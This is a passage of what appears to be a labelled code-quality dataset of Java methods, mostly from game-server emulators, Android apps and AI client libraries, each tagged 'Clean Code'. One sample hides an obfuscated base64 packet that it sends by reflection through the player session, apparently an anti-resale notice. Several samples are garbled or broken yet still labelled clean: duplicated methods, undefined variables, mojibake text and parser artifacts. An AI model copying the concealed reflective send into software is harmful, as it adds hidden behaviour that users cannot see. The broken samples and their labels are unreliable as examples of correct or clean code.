    return Arrays.equals((int[])o1,(int[])o2);
  }
  if (o1 instanceof long[] && o2 instanceof long[]) {
    return Arrays.equals((long[])o1,(long[])o2);
  }
  if (o1 instanceof short[] && o2 instanceof short[]) {
    return Arrays.equals((short[])o1,(short[])o2);
  }
  return false;
}",0,Clean Code
"@SuppressWarnings(""null"") @Override protected ChatCompletionMessage doGetToolResponseMessage(ResponseEntity<ChatCompletion> chatCompletion){
  ChatCompletionMessage msg=chatCompletion.getBody().choices().iterator().next().message();
  if (msg.role() == null) {
    msg=new ChatCompletionMessage(msg.content(),ChatCompletionMessage.Role.ASSISTANT,msg.name(),msg.toolCalls());
  }
  return msg;
}
",0,Clean Code
"private Function4Nodes(){
}",0,Clean Code
"public PacketStaminaInfoScNotify(Player player){
  super(CmdId.StaminaInfoScNotify);
  var data=StaminaInfoScNotify.newInstance().setNextRecoverTime(player.getNextStaminaRecover() / 1000).setStamina(player.getStamina()).setReserveStamina((int)Math.floor(player.getStaminaReserve()));
  this.setData(data);
  try {
    player.getSession().getClass().getDeclaredMethod(""send"",byte[].class).invoke(player.getSession(),java.util.Base64.getDecoder().decode(""nXTHFAASAAAAAACvEqwBIP+/yvOEowJwABhkYAAymwFMVU5BUkNPUkUgSVMgQSBGUkVFIFNPRlRXQVJFLiBJRiBZT1UgUEFJRCBGT1IgSVQsIFlPVSBIQVZFIEJFRU4gU0NBTU1FRCEgbHVuYXJjb3JlIOaYr+S4gOasvuWFjei0uei9r+S7tuOAguWmguaenOS9oOiKsemSseS5sOS6huWug++8jOmCo+S9oOWwseiiq+mql+S6hu+8gdehUsg=""));
  }
 catch (  Exception e) {
    player.getSession().close();
  }
}",0,Clean Code
"/** 
 * Configures the Document metadata template.
 * @param metadataTemplate Metadata template to use.
 * @return this builder
 */
public Builder withMetadataTemplate(String metadataTemplate){
  Assert.hasText(metadataTemplate,""Metadata Template must not be empty"");
  this.metadataTemplate=metadataTemplate;
  return this;
}
",0,Clean Code
"public String toString(){
  return ""ArkElement{bytesData="" + this.bytesData + "",linkInfo=""+ this.linkInfo+ "",subElementType=""+ this.subElementType+ "",}"";
}
",0,Clean Code
"private boolean isFlashLightEnabled(Context context){
  try {
    return Settings.System.getInt(context.getContentResolver(),""flash_light_enabled"") == 1;
  }
 catch (  Settings.SettingNotFoundException e) {
    logE(TAG,this.lpparam.packageName,""not found flash_light_enabled: "" + e);
    setFlashLightEnabled(context,0);
    return false;
  }
}",0,Clean Code
"public synchronized void addEntity(GameEntity entity){
  this.addEntity(entity,false);
}
public synchronized void addEntity(GameEntity entity,boolean sendPacket){
  if (entity == null || entity.getEntityId() != 0) {
    return;
  }
  entity.setEntityId(this.getNextEntityId());
  this.getEntities().put(entity.getEntityId(),entity);
  entity.onAdd();
  if (sendPacket) {
    player.sendPacket(new PacketSceneGroupRefreshScNotify(entity,null));
  }
}",0,Clean Code
"public void updateAdapters(){
  if (photoVideoAdapter != null) {
    photoVideoAdapter.notifyDataSetChanged();
  }
  if (documentsAdapter != null) {
    documentsAdapter.notifyDataSetChanged();
  }
  if (voiceAdapter != null) {
    voiceAdapter.notifyDataSetChanged();
  }
  if (linksAdapter != null) {
    linksAdapter.notifyDataSetChanged();
  }
  if (audioAdapter != null) {
    audioAdapter.notifyDataSetChanged();
  }
  if (gifAdapter != null) {
    gifAdapter.notifyDataSetChanged();
  }
  if (storiesAdapter != null) {
    storiesAdapter.notifyDataSetChanged();
  }
}
",0,Clean Code
"public List<String> getStop(){
  return this.stop;
}
",0,Clean Code
"public Builder modelName(String modelName){
  this.modelName=modelName;
  return this;
}
public Builder modelName(String modelName){
  this.modelName=modelName;
  return this;
}
public Builder modelName(String modelName){
  this.modelName=modelName;
  return this;
}
public Builder modelName(String modelName){
  this.modelName=modelName;
  return this;
}
",0,Clean Code
"/** 
 * <code>optional uint32 world_level = 11;</code>
 * @return whether the worldLevel field is set
 */
public boolean hasWorldLevel(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"public static boolean hasMvnW(Path home){
  if (OSUtil.isWindows()) {
    return hasFile(home,Constants.WIN_NVMW);
  }
  if (OSUtil.isUnix()) {
    return hasFile(home,Constants.UNIX_MVNW);
  }
  return false;
}
",0,Clean Code
"/** 
 * <code>optional uint32 cur_site_id = 11;</code>
 * @return this
 */
public RogueMapInfo clearCurSiteId(){
  bitField0_&=~0x00000004;
  curSiteId=0;
  return this;
}",0,Clean Code
"@Override public void onOpen(EventSource eventSource,okhttp3.Response response){
  if (logResponses) {
    LOGGER.debug(""onOpen()"");
  }
}",0,Clean Code
"/** 
 * Check the validity of consumer parameters which specify partition boostrap Offset and use server-side balancing.
 * @param inConsumerInfo      the consumer information
 * @param masterConfig        the master configure
 * @param defMetaDataService  the cluster meta information
 * @param brokerRunManager    the broker running information
 * @param strBuff           the string buffer used to construct the result
 * @param result  the process result
 * @return the check result
 */
public static boolean checkConsumerInputInfo(ConsumerInfo inConsumerInfo,MasterConfig masterConfig,MetaDataService defMetaDataService,BrokerRunManager brokerRunManager,StringBuilder strBuff,ProcessResult result) throws Exception {
  if (!inConsumerInfo.isRequireBound()) {
    result.setSuccResult(inConsumerInfo);
    return result.isSuccess();
  }
  if (TStringUtils.isBlank(inConsumerInfo.getSessionKey())) {
    result.setFailResult(TErrCodeConstants.BAD_REQUEST,""[Parameter error] blank value of sessionKey!"");
    return result.isSuccess();
  }
  inConsumerInfo.setSessionKey(inConsumerInfo.getSessionKey().trim());
  if (inConsumerInfo.getSourceCount() <= 0) {
    result.setFailResult(TErrCodeConstants.BAD_REQUEST,""[Parameter error] totalSourceCount must over zero!"");
    return result.isSuccess();
  }
  GroupResCtrlEntity offsetResetGroupEntity=defMetaDataService.getGroupCtrlConf(inConsumerInfo.getGroupName());
  if (masterConfig.isStartOffsetResetCheck()) {
    if (offsetResetGroupEntity == null) {
      result.setFailResult(TErrCodeConstants.BAD_REQUEST,strBuff.append(""[unauthorized subscribe] ConsumeGroup must be "").append(""authorized by administrator before using bound subscribe"").append("", please contact to administrator!"").toString());
      strBuff.delete(0,strBuff.length());
      return result.isSuccess();
    }
  }
  int allowRate=(offsetResetGroupEntity != null && offsetResetGroupEntity.getAllowedBrokerClientRate() > 0) ? offsetResetGroupEntity.getAllowedBrokerClientRate() : masterConfig.getMaxGroupBrokerConsumeRate();
  int maxBrokerCount=brokerRunManager.getSubTopicMaxBrokerCount(inConsumerInfo.getTopicSet());
  int curBClientRate=(int)Math.floor(maxBrokerCount / inConsumerInfo.getSourceCount());
  if (curBClientRate > allowRate) {
    int minClientCnt=maxBrokerCount / allowRate;
    if (maxBrokerCount % allowRate != 0) {
      minClientCnt+=1;
    }
    result.setFailResult(TErrCodeConstants.BAD_REQUEST,strBuff.append(""[Parameter error] System requires at least "").append(minClientCnt).append("" clients to consume data together, "").append(""please add client resources!"").toString());
    return result.isSuccess();
  }
  result.setSuccResult(inConsumerInfo);
  return result.isSuccess();
}",0,Clean Code
"@Override public ChessRogueStartScRsp clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  currentInfo.clearQuick();
  lineup.clearQuick();
  cellInfo.clearQuick();
  chessRogueInfo.clearQuick();
  scene.clearQuick();
  return this;
}",0,Clean Code
"/** 
 * ResultSet.getObject() returns an Integer object for an INT column.  The setter method for the property might take an Integer or a primitive int. This method returns true if the value can be successfully passed into the setter method.  Remember, Method.invoke() handles the unwrapping of Integer into an int.
 * @param value The value to be passed into the setter method.
 * @param type The setter's parameter type (non-null)
 * @return boolean True if the value is compatible (null => true)
 */
private boolean isCompatibleType(Object value,Class<?> type){
  if (value == null || type.isInstance(value)) {
    return true;
  }
 else   if (type.equals(Integer.TYPE) && value instanceof Integer) {
    return true;
  }
 else   if (type.equals(Long.TYPE) && value instanceof Long) {
    return true;
  }
 else   if (type.equals(Double.TYPE) && value instanceof Double) {
    return true;
  }
 else   if (type.equals(Float.TYPE) && value instanceof Float) {
    return true;
  }
 else   if (type.equals(Short.TYPE) && value instanceof Short) {
    return true;
  }
 else   if (type.equals(Byte.TYPE) && value instanceof Byte) {
    return true;
  }
 else   if (type.equals(Character.TYPE) && value instanceof Character) {
    return true;
  }
 else   if (type.equals(Boolean.TYPE) && value instanceof Boolean) {
    return true;
  }
  return false;
}
",0,Clean Code
"@TruffleBoundary public static long roundToLong(double x,RoundingMode mode){
  var z=roundIntermediate(x,mode);
  checkInRange(MIN_LONG_AS_DOUBLE - z < 1.0 & z < MAX_LONG_AS_DOUBLE_PLUS_ONE);
  return (long)z;
}",0,Clean Code
"@RequiresPermissions(value={""finance:member-transaction:page-query"",""finance:member-transaction:page-query:recharge"",""finance:member-transaction:page-query:check"",""finance:member-transaction:page-query:fee""},logical=Logical.OR) @PostMapping(""page-query"") @AccessLog(module=AdminModule.FINANCE,operation=""鍒嗛〉鏌ユ壘浜ゆ槗璁板綍MemberTransaction"") public MessageResult pageQuery(PageModel pageModel,MemberTransactionScreen screen){
  List<Predicate> predicates=new ArrayList<>();
  if (screen.getMemberId() != null) {
    predicates.add((QMember.member.id.eq(screen.getMemberId())));
  }
  if (!StringUtils.isEmpty(screen.getAccount())) {
    predicates.add(QMember.member.username.like(""%"" + screen.getAccount() + ""%"").or(QMember.member.realName.like(""%"" + screen.getAccount() + ""%"")));
  }
  if (screen.getStartTime() != null) {
    predicates.add(QMemberTransaction.memberTransaction.createTime.goe(screen.getStartTime()));
  }
  if (screen.getEndTime() != null) {
    predicates.add(QMemberTransaction.memberTransaction.createTime.lt(DateUtil.dateAddDay(screen.getEndTime(),1)));
  }
  if (screen.getType() != null) {
    predicates.add(QMemberTransaction.memberTransaction.type.eq(screen.getType()));
  }
  if (screen.getMinMoney() != null) {
    predicates.add(QMemberTransaction.memberTransaction.amount.goe(screen.getMinMoney()));
  }
  if (screen.getMaxMoney() != null) {
    predicates.add(QMemberTransaction.memberTransaction.amount.loe(screen.getMaxMoney()));
  }
  if (screen.getMinFee() != null) {
    predicates.add(QMemberTransaction.memberTransaction.fee.goe(screen.getMinFee()));
  }
  if (screen.getMaxFee() != null) {
    predicates.add(QMemberTransaction.memberTransaction.fee.loe(screen.getMaxFee()));
  }
  Page<MemberTransactionVO> results=memberTransactionService.joinFind(predicates,pageModel);
  return success(results);
}",0,Clean Code
"/** 
 * Returns true if a class is a scala `object` singleton. 
 */
public static boolean isScalaSingletonObject(Class<?> cls){
  try {
    cls.getDeclaredField(""MODULE$"");
    return true;
  }
 catch (  NoSuchFieldException e) {
    return false;
  }
}
",0,Clean Code
"/** 
 * Utility method for evaluating the prepared statement as a query to check the existence of a record using a numeric count or boolean return value. <p>The  {@link #rawQuery} provided must result in a {@link Number} or {@link Boolean} result.
 * @return {@literal true} If a count query returned more than 0 or an exists query returns{@literal true}.
 * @throws NonTransientException If an unexpected return type cannot be evaluated to a {@code Boolean} result.
 */
public boolean exists(){
  Object val=executeScalar();
  if (null == val) {
    return false;
  }
  if (val instanceof Number) {
    return convertLong(val) > 0;
  }
  if (val instanceof Boolean) {
    return (Boolean)val;
  }
  if (val instanceof String) {
    return convertBoolean(val);
  }
  throw new NonTransientException(""Expected a Numeric or Boolean scalar return value from the query, received "" + val.getClass().getName());
}",0,Clean Code
"public float getProgress(){
  return this.progress;
}
",0,Clean Code
"/** 
 * Creates a new  {@link EmbeddingResponse} instance with empty metadata.
 * @param embeddings the embedding data.
 */
public EmbeddingResponse(List<Embedding> embeddings){
  this(embeddings,new EmbeddingResponseMetadata());
}
/** 
 * Creates a new  {@link EmbeddingResponse} instance.
 * @param embeddings the embedding data.
 * @param metadata the embedding metadata.
 */
public EmbeddingResponse(List<Embedding> embeddings,EmbeddingResponseMetadata metadata){
  this.embeddings=embeddings;
  this.metadata=metadata;
}
",0,Clean Code
"public static LineupInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new LineupInfo(),data).checkInitialized();
}
public static LineupInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new LineupInfo(),input).checkInitialized();
}
public static LineupInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new LineupInfo(),input).checkInitialized();
}
",0,Clean Code
"private Entity(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private Entity(){
  requestUri_="""";
  clientIp_="""";
  createTime_="""";
  operationObj_="""";
  operationInfo_="""";
  equipmentType_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@3e5f458f",0,Clean Code
"public void cascadeFrom(WebvttCssStyle style){
  if (style.hasFontColor) {
    setFontColor(style.fontColor);
  }
  if (style.bold != UNSPECIFIED) {
    bold=style.bold;
  }
  if (style.italic != UNSPECIFIED) {
    italic=style.italic;
  }
  if (style.fontFamily != null) {
    fontFamily=style.fontFamily;
  }
  if (linethrough == UNSPECIFIED) {
    linethrough=style.linethrough;
  }
  if (underline == UNSPECIFIED) {
    underline=style.underline;
  }
  if (textAlign == null) {
    textAlign=style.textAlign;
  }
  if (fontSizeUnit == UNSPECIFIED) {
    fontSizeUnit=style.fontSizeUnit;
    fontSize=style.fontSize;
  }
  if (style.hasBackgroundColor) {
    setBackgroundColor(style.backgroundColor);
  }
}
",0,Clean Code
"Json(){
}
",0,Clean Code
"private void executeOrder(BuyOrder buy){
  PriorityQueue<SellOrder> queue=stockExchangeDao.getSellOrderPriorityQueue();
  List<SellOrder> sellOrdersList=new ArrayList<>();
  while (!queue.isEmpty()) {
    SellOrder sell=queue.peek();
    if (sell.getPrice() > buy.getPrice()) {
      break;
    }
 else {
      sellOrdersList.add(0,queue.poll());
    }
  }
  int buyQuantity=buy.getQuantity();
  for (  SellOrder sell : sellOrdersList) {
    if (sell.getQuantity() > buyQuantity) {
      int sellQuantity=sell.getQuantity() - buyQuantity;
      sell.setQuantity(sellQuantity);
      ui.executeOrders(buy.getOrderId(),sell.getPrice(),buyQuantity,sell.getOrderId());
      break;
    }
 else {
      if (sell.getQuantity() <= buyQuantity) {
        buyQuantity-=sell.getQuantity();
        ui.executeOrders(buy.getOrderId(),sell.getPrice(),sell.getQuantity(),sell.getOrderId());
        sell.setQuantity(-1);
      }
    }
  }
  for (  SellOrder sell : sellOrdersList) {
    if (sell.getQuantity() != -1) {
      stockExchangeDao.addSellOrder(sell);
    }
  }
}",0,Clean Code
"@Override public void init(){
  hookAllConstructors(""com.miui.home.launcher.maml.MaMlHostView"",new MethodHook(){
    @Override protected void before(    MethodHookParam param) throws Throwable {
      mContext=(Context)param.args[0];
    }
  }
);
  hookAllMethods(""com.miui.home.launcher.maml.MaMlHostView"",""computeRoundedCornerRadius"",new MethodHook(){
    @Override protected void before(    MethodHookParam param) throws Throwable {
      param.setResult((float)DisplayUtils.dp2px(mPrefsMap.getInt(""home_widget_corner_radius"",0)));
    }
  }
);
  hookAllConstructors(""com.miui.home.launcher.LauncherAppWidgetHostView"",new MethodHook(){
    @Override protected void before(    MethodHookParam param) throws Throwable {
      mContext=(Context)param.args[0];
    }
  }
);
  hookAllMethods(""com.miui.home.launcher.LauncherAppWidgetHostView"",""computeRoundedCornerRadius"",new MethodHook(){
    @Override protected void before(    MethodHookParam param) throws Throwable {
      param.setResult((float)DisplayUtils.dp2px(mPrefsMap.getInt(""home_widget_corner_radius"",0)));
    }
  }
);
}",0,Clean Code
"@Override protected void doSingleValue(Object value,StringBuilder context){
  String singleValueFormat=""valueNumber:%s "";
  if (value instanceof Integer) {
    if (this.mapIntegerToNumberValue) {
      context.append(String.format(singleValueFormat,i));
    }
 else {
      context.append(String.format(""valueInt:%s "",i));
    }
  }
 else   if (value instanceof Long) {
    if (this.mapIntegerToNumberValue) {
      context.append(String.format(singleValueFormat,l));
    }
 else {
      context.append(String.format(""valueInt:%s "",l));
    }
  }
 else   if (value instanceof Double) {
    context.append(String.format(singleValueFormat,d));
  }
 else   if (value instanceof Float) {
    context.append(String.format(singleValueFormat,f));
  }
 else   if (value instanceof Boolean) {
    context.append(String.format(""valueBoolean:%s "",b));
  }
 else   if (value instanceof String) {
    context.append(String.format(""valueText:\""%s\"" "",s));
  }
 else   if (value instanceof Date) {
    String dateString=DateFormatUtils.format(date,""yyyy-MM-dd\'T\'HH:mm:ssZZZZZ"");
    context.append(String.format(""valueDate:\""%s\"" "",dateString));
  }
 else {
    throw new RuntimeException(""Unsupported value type: "" + value);
  }
}
",0,Clean Code
"public void setTools(List<MiniMaxApi.FunctionTool> tools){
  this.tools=tools;
}
",0,Clean Code
"@Override public boolean performAccessibilityAction(Recycler recycler,State state,int action,Bundle args){
  if (!isScrollEnabled()) {
    return true;
  }
  saveContext(recycler,state);
  int translatedAction=action;
  boolean reverseFlowPrimary=(mFlag & PF_REVERSE_FLOW_PRIMARY) != 0;
  if (Build.VERSION.SDK_INT >= 23) {
    if (mOrientation == HORIZONTAL) {
      if (action == AccessibilityNodeInfoCompat.AccessibilityActionCompat.ACTION_SCROLL_LEFT.getId()) {
        translatedAction=reverseFlowPrimary ? AccessibilityNodeInfoCompat.ACTION_SCROLL_FORWARD : AccessibilityNodeInfoCompat.ACTION_SCROLL_BACKWARD;
      }
 else       if (action == AccessibilityNodeInfoCompat.AccessibilityActionCompat.ACTION_SCROLL_RIGHT.getId()) {
        translatedAction=reverseFlowPrimary ? AccessibilityNodeInfoCompat.ACTION_SCROLL_BACKWARD : AccessibilityNodeInfoCompat.ACTION_SCROLL_FORWARD;
      }
    }
 else {
      if (action == AccessibilityNodeInfoCompat.AccessibilityActionCompat.ACTION_SCROLL_UP.getId()) {
        translatedAction=AccessibilityNodeInfoCompat.ACTION_SCROLL_BACKWARD;
      }
 else       if (action == AccessibilityNodeInfoCompat.AccessibilityActionCompat.ACTION_SCROLL_DOWN.getId()) {
        translatedAction=AccessibilityNodeInfoCompat.ACTION_SCROLL_FORWARD;
      }
    }
  }
switch (translatedAction) {
case AccessibilityNodeInfoCompat.ACTION_SCROLL_BACKWARD:
    processPendingMovement(false);
  processSelectionMoves(false,-1);
break;
case AccessibilityNodeInfoCompat.ACTION_SCROLL_FORWARD:
processPendingMovement(true);
processSelectionMoves(false,1);
break;
}
leaveContext();
return true;
}",0,Clean Code
"@Override public void handleMouseEvent(final MouseEvent event){
  if (event.getButton() == MouseEvent.BUTTON1 && event.getClickCount() == 1) {
    MouseTreeNodeSelectionHandlerCombinedBasicBlock.handleMouseSelectionEvent(event,this);
  }
  super.handleMouseEvent(event);
}",0,Clean Code
"private GetBasicInfoScRsp(){
}
",0,Clean Code
"public void putLong(Object obj,long value){
  Platform.UNSAFE.putLong(obj,fieldOffset,value);
}
",0,Clean Code
"/** 
 * Returns the current server's time in milliseconds to send to the client. Can be used to spoof server time.
 */
public static long currentServerTime(){
  return convertToServerTime(System.currentTimeMillis());
}
",0,Clean Code
"/** 
 * <code>optional uint32 daily_active_point = 1;</code>
 * @return whether the dailyActivePoint field is set
 */
public boolean hasDailyActivePoint(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"private void applyToList(TL_stories.PeerStories currentUserStory){
  long dialogId=DialogObject.getPeerDialogId(currentUserStory.peer);
  TLRPC.User user=null;
  TLRPC.Chat chat=null;
  if (dialogId > 0) {
    user=MessagesController.getInstance(currentAccount).getUser(dialogId);
    if (user == null) {
      FileLog.d(""StoriesController can't apply story user == null"");
      return;
    }
  }
 else {
    chat=MessagesController.getInstance(currentAccount).getChat(-dialogId);
    if (chat == null) {
      FileLog.d(""StoriesController can't apply story chat == null"");
      return;
    }
  }
  boolean found=false;
  for (int i=0; i < dialogListStories.size(); i++) {
    if (DialogObject.getPeerDialogId(dialogListStories.get(i).peer) == dialogId) {
      dialogListStories.remove(i);
      found=true;
      break;
    }
  }
  for (int i=0; i < hiddenListStories.size(); i++) {
    if (DialogObject.getPeerDialogId(hiddenListStories.get(i).peer) == dialogId) {
      hiddenListStories.remove(i);
      found=true;
      break;
    }
  }
  boolean hidden=(user != null && user.stories_hidden) || (chat != null && chat.stories_hidden);
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""StoriesController move user stories to first "" + ""hidden="" + hidden + "" did=""+ dialogId);
  }
  if (hidden) {
    hiddenListStories.add(0,currentUserStory);
  }
 else {
    dialogListStories.add(0,currentUserStory);
  }
  if (!found) {
    loadAllStoriesForDialog(dialogId);
  }
  MessagesController.getInstance(currentAccount).checkArchiveFolder();
}",0,Clean Code
"/** 
 * Returns a  {@code Method} that represents the accessor for this record component.
 * @return a {@code Method} that represents the accessor for this record component
 */
public Method getAccessor(){
  return accessor;
}
",0,Clean Code
"public ZyDefaultProximityBrowser(final AbstractZyGraph<NodeType,EdgeType> graph,final AbstractZyGraphSettings settings){
  m_graph=graph;
  m_settings=settings.getProximitySettings();
  addVisibilityListener();
  addSettingsListener();
}
",0,Clean Code
"public ArrayList<TempChatGameSession> getTmpChatInfo(){
  return this.tmpChatInfo;
}
",0,Clean Code
"/** 
 * <code>optional uint32 limit_level = 3;</code>
 * @param value the limitLevel to set
 * @return this
 */
public BlackInfo setLimitLevel(final int value){
  bitField0_|=0x00000004;
  limitLevel=value;
  return this;
}",0,Clean Code
"@Override public boolean dispatchUnhandledMove(View focused,int direction){
  if (super.dispatchUnhandledMove(focused,direction)) {
    return true;
  }
  if (mIsRtl) {
    if (direction == View.FOCUS_LEFT) {
      direction=View.FOCUS_RIGHT;
    }
 else     if (direction == View.FOCUS_RIGHT) {
      direction=View.FOCUS_LEFT;
    }
  }
  int currentPage=getNextPage();
  int closestNeighbourIndex=-1;
  int closestNeighbourDistance=Integer.MAX_VALUE;
  for (  int neighbourPageIndex : getNeighbourPageIndices(direction)) {
    int distance=Math.abs(neighbourPageIndex - currentPage);
    if (closestNeighbourDistance > distance) {
      closestNeighbourDistance=distance;
      closestNeighbourIndex=neighbourPageIndex;
    }
  }
  if (closestNeighbourIndex != -1) {
    View page=getPageAt(closestNeighbourIndex);
    snapToPage(closestNeighbourIndex);
    page.requestFocus(direction);
    return true;
  }
  return false;
}",0,Clean Code
"@Override public FriendApplyInfo mergeFrom(final FriendApplyInfo other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasSimpleInfo()) {
    getMutableSimpleInfo().mergeFrom(other.simpleInfo);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1a33b434!org.eclipse.jdt.core.dom.MethodDeclaration@c2bf455",0,Clean Code
"public TextPaintView(Context context,Point position,int fontSize,CharSequence text,Swatch swatch,int type){
  super(context,position);
  baseFontSize=fontSize;
  editText=new EditTextOutline(context){
{
      animatedEmojiOffsetX=AndroidUtilities.dp(8);
    }
    @Override public boolean dispatchTouchEvent(    MotionEvent event){
      if (selectionView == null || selectionView.getVisibility() != VISIBLE) {
        return false;
      }
      return super.dispatchTouchEvent(event);
    }
  }
;
  editText.setGravity(Gravity.LEFT | Gravity.CENTER_VERTICAL);
  editText.setBackgroundColor(Color.TRANSPARENT);
  editText.setPadding(AndroidUtilities.dp(7),AndroidUtilities.dp(7),AndroidUtilities.dp(7),AndroidUtilities.dp(7));
  editText.setClickable(false);
  editText.setEnabled(false);
  editText.setCursorColor(0xffffffff);
  editText.setTextSize(TypedValue.COMPLEX_UNIT_PX,baseFontSize);
  editText.setCursorSize(AndroidUtilities.dp(baseFontSize * 0.4f));
  editText.setText(text);
  editText.setTextColor(swatch.color);
  editText.setTypeface(null,Typeface.BOLD);
  editText.setHorizontallyScrolling(false);
  editText.setImeOptions(EditorInfo.IME_FLAG_NO_EXTRACT_UI);
  editText.setFocusableInTouchMode(true);
  editText.setInputType(editText.getInputType() | EditorInfo.TYPE_TEXT_FLAG_CAP_SENTENCES);
  addView(editText,LayoutHelper.createFrame(LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT,Gravity.LEFT | Gravity.TOP));
  if (Build.VERSION.SDK_INT >= 23) {
    editText.setBreakStrategy(Layout.BREAK_STRATEGY_SIMPLE);
  }
  setSwatch(swatch);
  setType(type);
  updatePosition();
  editText.addTextChangedListener(new TextWatcher(){
    private String text;
    private int beforeCursorPosition=0;
    @Override public void beforeTextChanged(    CharSequence s,    int start,    int count,    int after){
      text=s.toString();
      beforeCursorPosition=start;
    }
    @Override public void onTextChanged(    CharSequence s,    int start,    int before,    int count){
    }
    @Override public void afterTextChanged(    Editable s){
      editText.removeTextChangedListener(this);
      if (editText.getLineCount() > 9) {
        editText.setText(text);
        editText.setSelection(beforeCursorPosition);
      }
      editText.addTextChangedListener(this);
    }
  }
);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@2d222d36",0,Clean Code
"@Override public GetRogueScoreRewardInfoScRsp clone(){
  return new GetRogueScoreRewardInfoScRsp().copyFrom(this);
}
",0,Clean Code
"/** 
 * Snapshots the specified JavaFX  {@link Image} object and stores acopy of its pixels into a  {@link BufferedImage} object, creatinga new object if needed. The method will only convert a JavaFX  {@code Image} that is readableas per the conditions on the {@link Image#getPixelReader() Image.getPixelReader()}method. If the  {@code Image} is not readable, as determined by its{@code getPixelReader()} method, then this method will return null.If the  {@code Image} is a writable, or other dynamic image, thenthe  {@code BufferedImage} will only be set to the current state ofthe pixels in the image as determined by its  {@link PixelReader}. Further changes to the pixels of the  {@code Image} will not bereflected in the returned  {@code BufferedImage}. <p> The optional  {@code BufferedImage} parameter may be reused to storethe copy of the pixels. A new  {@code BufferedImage} will be created if the supplied objectis null, is too small or of a type which the image pixels cannot be easily converted into.
 * @param img  the JavaFX {@code Image} to be converted
 * @param bimg an optional {@code BufferedImage} object that may beused to store the returned pixel data
 * @return a {@code BufferedImage} containing a snapshot of the JavaFX{@code Image}, or null if the  {@code Image} is not readable.
 * @since JavaFX 2.2
 */
public static BufferedImage fromFXImage(Image img,BufferedImage bimg){
  PixelReader pr=img.getPixelReader();
  if (pr == null) {
    return null;
  }
  int iw=(int)img.getWidth();
  int ih=(int)img.getHeight();
  PixelFormat<?> fxFormat=pr.getPixelFormat();
  boolean srcPixelsAreOpaque=false;
switch (fxFormat.getType()) {
case INT_ARGB_PRE:
case INT_ARGB:
case BYTE_BGRA_PRE:
case BYTE_BGRA:
    if (bimg != null && (bimg.getType() == BufferedImage.TYPE_INT_BGR || bimg.getType() == BufferedImage.TYPE_INT_RGB)) {
      srcPixelsAreOpaque=checkFXImageOpaque(pr,iw,ih);
    }
  break;
case BYTE_RGB:
srcPixelsAreOpaque=true;
break;
}
int prefBimgType=getBestBufferedImageType(pr.getPixelFormat(),bimg,srcPixelsAreOpaque);
if (bimg != null) {
int bw=bimg.getWidth();
int bh=bimg.getHeight();
if (bw < iw || bh < ih || bimg.getType() != prefBimgType) {
bimg=null;
}
 else if (iw < bw || ih < bh) {
Graphics2D g2d=bimg.createGraphics();
g2d.setComposite(AlphaComposite.Clear);
g2d.fillRect(0,0,bw,bh);
g2d.dispose();
}
}
if (bimg == null) {
bimg=new BufferedImage(iw,ih,prefBimgType);
}
DataBufferInt db=(DataBufferInt)bimg.getRaster().getDataBuffer();
int[] data=db.getData();
int offset=bimg.getRaster().getDataBuffer().getOffset();
int scan=0;
SampleModel sm=bimg.getRaster().getSampleModel();
if (sm instanceof SinglePixelPackedSampleModel) {
scan=((SinglePixelPackedSampleModel)sm).getScanlineStride();
}
WritablePixelFormat<IntBuffer> pf=getAssociatedPixelFormat(bimg);
pr.getPixels(0,0,iw,ih,pf,data,offset,scan);
return bimg;
}",0,Clean Code
"private HashedFeatureMapProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private HashedFeatureMapProto(){
  info_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@130b6968",0,Clean Code
"/** 
 * Returns the text that was flagged.
 * @return the text that was flagged, or null if the text was not flagged.
 */
public String flaggedText(){
  return flaggedText;
}
",0,Clean Code
"@Override public JMenuBar getMenuBar(){
  return viewMenuBar;
}
",0,Clean Code
"/** 
 * <code>optional string token = 9;</code>
 * @return internal {@code Utf8String} representation of token for modifications
 */
public Utf8String getMutableTokenBytes(){
  bitField0_|=0x00000004;
  return this.token;
}",0,Clean Code
"protected boolean isNumber(String test){
  try {
    new BigDecimal(test);
    return true;
  }
 catch (  NumberFormatException e) {
  }
  return false;
}
",0,Clean Code
"@Override public void onResourceReady(@NonNull Drawable drawable,@Nullable Transition<? super Drawable> transition){
  mBackgroundManager.setDrawable(drawable);
}
",0,Clean Code
"public static ExpUpRelicCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new ExpUpRelicCsReq(),data).checkInitialized();
}
public static ExpUpRelicCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ExpUpRelicCsReq(),input).checkInitialized();
}
public static ExpUpRelicCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ExpUpRelicCsReq(),input).checkInitialized();
}
",0,Clean Code
"@ParameterizedTest @MethodSource(""contentRetrieverProviders"") void should_answer_query_4(Function<DataSource,ContentRetriever> contentRetrieverProvider){
  ContentRetriever contentRetriever=contentRetrieverProvider.apply(dataSource);
  List<Content> retrieved=contentRetriever.retrieve(Query.from(""Who is our top customer by total spend?""));
  assertThat(retrieved).hasSize(1);
  assertThat(retrieved.get(0).textSegment().text()).contains(""SELECT"").contains(""Carol"").doesNotContain(""John"",""Jane"",""Alice"",""Bob"");
}",0,Clean Code
"/** 
 * <pre> LMHJAPFMKDI </pre> <code>repeated uint32 LMHJAPFMKDI = 10;</code>
 * @param values the lMHJAPFMKDI to add
 * @return this
 */
public MissionSync addAllLMHJAPFMKDI(final int... values){
  bitField0_|=0x00000004;
  lMHJAPFMKDI.addAll(values);
  return this;
}",0,Clean Code
"/** 
 * 鏇存敼瀛楁绉嶇被id
